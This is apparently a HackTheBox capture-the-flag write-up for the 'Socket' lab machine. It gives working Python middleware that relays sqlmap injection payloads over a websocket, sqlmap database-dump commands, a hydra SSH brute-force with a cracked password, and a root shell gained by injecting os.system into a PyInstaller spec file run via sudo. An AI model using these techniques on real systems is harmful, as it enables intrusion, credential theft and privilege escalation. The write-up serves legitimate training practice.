---
title: HackTheBox - Socket
author: 0
date: 2023-03-29 16:00:00 +0800
categories: [htb, machine]
tags: [debugging, reverse-engineering, websockets, sql-injection, spec-files, sudo-l]
render_with_liquid: false
---

### Foothold
#### Debug downloaded app ELF file

#### Do discovery on the websocket to get endpoints

**discovery.py**
```python
import websocket
import json

def get_ws_endpoints(ws):
    ws.send('{}')
    print(ws.recv())

ws_host = 'ws://qreader.htb:5789'

#create the connection
ws = websocket.create_connection(ws_host)

#get the available endpoints
get_ws_endpoints(ws)

#send payloads with different versions to /version
versions = ["0", "1","2", "0.0.1", "0.1", "1.0", "1.1", "2.0"]
for version in versions:
    payload = {"version": version}
    version_ws = websocket.create_connection(ws_host + '/version')
    version_ws.send(json.dumps(payload))
    print(version_ws.recv())
    version_ws.close()
req_ws = websocket.create_connection(ws_host + '/version?id=1')
print(req_ws.recv())
req_ws.close()

#close the initial connection
ws.close()
```

##### output
```bash
$ python3 ws_discovery.py         
{"paths": {"/update": "Check for updates", "/version": "Get version information"}}
{"message": "Invalid version!"}
{"message": "Invalid version!"}
{"message": "Invalid version!"}
{"message": {"id": 1, "version": "0.0.1", "released_date": "12/07/2022", "downloads": 280}}
{"message": "Invalid version!"}
{"message": "Invalid version!"}
{"message": "Invalid version!"}
{"message": "Invalid version!"}
```

#### Create exploit middleware to perform SQL map queries on ([source](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html))

**middleware.py**
```python
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://qreader.htb:5789"

def send_ws(payload):
    ws = create_connection(ws_server + '/version')
    payload = unquote(payload).replace("'","\\\"")
    data = '{"version":"%s"}' % payload
    ws.send(data)
    resp = ws.recv()
    ws.close()

    if resp:
        return resp
    else:
        return ''

def middleware_server(host_port,content_type="text/plain"):

    class CustomHandler(SimpleHTTPRequestHandler):
        def do_GET(self) -> None:
            self.send_response(200)
            try:
                payload = urlparse(self.path).query.split('=',1)[1]
            except IndexError:
                payload = False
                
            if payload:
                content = send_ws(payload)
            else:
                content = 'No parameters specified!'

            self.send_header("Content-type", content_type)
            self.end_headers()
            self.wfile.write(content.encode())
            return

    class _TCPServer(TCPServer):
        allow_reuse_address = True

    httpd = _TCPServer(host_port, CustomHandler)
    httpd.serve_forever()

print("[+] Starting Middleware Server")
print("[+] Send payloads in http://localhost:8081/?version=*")

try:
    middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
    pass
```
##### output
```bash
$ python3 exploit2.py       
[+] Starting Middleware Server
[+] Send payloads in http://localhost:8081/?version=*

```

#### Execute SQLMap on the running middleware server
`$ sqlmap -u "http://localhost:8081/?version=*" --batch --dbs  --level 5 --risk 3`

#### Get database structure and data
```bash
> sqlmap -u "http://localhost:8081/?version=*"   --tables 
[11:11:38] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[11:11:38] [INFO] fetching tables for database: 'SQLite_masterdb'
<current>
[6 tables]
+-----------------+
| answers         |
| info            |
| reports         |
| sqlite_sequence |
| users           |
| versions        |
+-----------------+
```

```bash
sqlmap -u "http://localhost:8081/?version=*"  --dbms=SQLite --dump
```

##### Found data
We can see the md5 hashed admin password in the users table. MD5 is easy to crack with a bunch of tools.

We can see also some interesting text in the answers table:
> Hello Json,\n\nAs if now we support PNG formart only. We will be adding JPEG/SVG file formats in our next version.\n\nThomas Keller 

>Hello Mike,\n\n We have confirmed a valid problem with handling non-ascii charaters. So we suggest you to stick with ascci printable characters for now!\n\nThomas Keller

#### Brute force username for SSH login with hydra
We created a file with different username variations for Thomas Keller based on the data we got from the database
```bash
$ cat usernames.txt                     
thomas
mike
Thomas
Mike
thomas-keller
thomas_keller
tkeller
thomask
thomas_keller
thomas_keller
Thomas_keller
Thomas_Keller
Thomas-Keller
Json

```

```bash
hydra -L usernames.txt -p 'denjanjade122566' 10.10.11.206 ssh
[DATA] max 14 tasks per 1 server, overall 14 tasks, 14 login tries (l:14/p:1), ~1 try per task
[DATA] attacking ssh://10.10.11.206:22/
[22][ssh] host: 10.10.11.206   login: tkeller   password: _redacted_
```

```
tkeller@socket:~$ ls
user.txt
tkeller@socket:~$ whoami
tkeller
tkeller@socket:~$ cat user.txt
```

### Priv esc

```bash
tkeller@socket:~$ sudo -l
Matching Defaults entries for tkeller on socket:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tkeller may run the following commands on socket:
    (ALL : ALL) NOPASSWD: /usr/local/sbin/build-installer.sh
```

Our user can sudo run `/usr/local/sbin/build-installer.sh`. It looks like this allows to create spec files and to build based on these spec files. The spec file tells PyInstaller how to process your script. It encodes the script names and most of the options you give to the pyinstaller command. **The spec file is actually executable Python code**. PyInstaller builds the app by executing the contents of the spec file.

```bash
tkeller@socket:~$ cat /usr/local/sbin/build-installer.sh
#!/bin/bash
if [ $# -ne 2 ] && [[ $1 != 'cleanup' ]]; then
  /usr/bin/echo "No enough arguments supplied"
  exit 1;
fi

action=$1
name=$2
ext=$(/usr/bin/echo $2 |/usr/bin/awk -F'.' '{ print $(NF) }')

if [[ -L $name ]];then
  /usr/bin/echo 'Symlinks are not allowed'
  exit 1;
fi

if [[ $action == 'build' ]]; then
  if [[ $ext == 'spec' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /home/svc/.local/bin/pyinstaller $name
    /usr/bin/mv ./dist ./build /opt/shared
  else
    echo "Invalid file format"
    exit 1;
  fi
elif [[ $action == 'make' ]]; then
  if [[ $ext == 'py' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /root/.local/bin/pyinstaller -F --name "qreader" $name --specpath /tmp
   /usr/bin/mv ./dist ./build /opt/shared
  else
    echo "Invalid file format"
    exit 1;
  fi
elif [[ $action == 'cleanup' ]]; then
  /usr/bin/rm -r ./build ./dist 2>/dev/null
  /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
  /usr/bin/rm /tmp/qreader* 2>/dev/null
else
  /usr/bin/echo 'Invalid action'
  exit 1;
fi
```

We can generate our own spec file, which allows us to inject arbirtray Python commands that will then be ran by root.

```bash
tkeller@socket:~$ sudo /usr/local/sbin/build-installer.sh build spec
185 INFO: PyInstaller: 5.6.2
185 INFO: Python: 3.10.6
188 INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35
189 INFO: wrote /home/tkeller/spec.spec
191 INFO: UPX is not available.
script '/home/tkeller/spec' not found
```

Adding in the code to spawn a shell as root.

```bash
tkeller@socket:~$ vi spec.spec
# -*- mode: python ; coding: utf-8 -*-

import os
os.system('/bin/bash')

block_cipher = None


a = Analysis(
    ['spec'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=[],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)
```

Calling the build process to execute the code in the `spec.spec` file, gaining access to the root shell and thus the root flag.

```bash
tkeller@socket:~$ sudo /usr/local/sbin/build-installer.sh build spec.spec
122 INFO: PyInstaller: 5.6.2
123 INFO: Python: 3.10.6
126 INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35
128 INFO: UPX is not available.
root@socket:/home/tkeller# id
uid=0(root) gid=0(root) groups=0(root)
root@socket:/home/tkeller# cat /root/root.txt
```
